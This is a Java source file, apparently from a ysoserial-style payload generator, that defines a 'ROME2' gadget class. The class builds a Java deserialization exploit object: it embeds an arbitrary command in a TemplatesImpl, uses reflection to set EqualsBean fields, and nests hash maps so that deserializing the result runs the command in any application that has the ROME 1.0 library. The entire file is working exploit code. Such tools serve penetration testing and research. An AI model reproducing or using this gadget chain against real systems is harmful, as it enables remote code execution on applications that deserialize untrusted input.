package A.R.ysogate.payloads.gadgets;


import com.sun.syndication.feed.impl.EqualsBean;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.util.Gadgets;
import A.R.ysogate.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.util.Map;


/**
 * JDK 8+
 */
@Dependencies("rome:rome:1.0")
public class ROME2 implements ObjectPayload<Object> {

	public Object getObject(String command) throws Exception {
		Object o = Gadgets.createTemplatesImpl(command);

		EqualsBean bean = new EqualsBean(String.class, "");

		Map map1 = Gadgets.createMap("aa", o);
		map1.put("bB", bean);

		Map map2 = Gadgets.createMap("aa", bean);
		map2.put("bB", o);

		Reflections.setFieldValue(bean, "_beanClass", Templates.class);
		Reflections.setFieldValue(bean, "_obj", o);

		return Gadgets.makeMap(map1, map2);
	}
}
